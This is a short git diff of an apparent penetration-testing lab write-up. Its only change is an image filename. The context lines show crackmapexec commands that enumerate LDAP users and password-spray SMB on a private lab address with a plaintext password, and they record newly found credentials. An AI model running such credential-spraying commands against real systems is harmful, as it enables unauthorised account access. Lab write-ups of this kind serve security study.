@@ -54,7 +54,7 @@ crackmapexec ldap 10.0.0.3 -u john -p Welcome2022! --users
 crackmapexec smb 10.0.0.3 -u users.txt -p passwords.txt --continue-on-success
 ```
 
-![](<../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (71) (1) (1) (1) (1) (1).png>)
 
 We discovered two extra set of credentials. `Bankuser` and `banktest`.
 
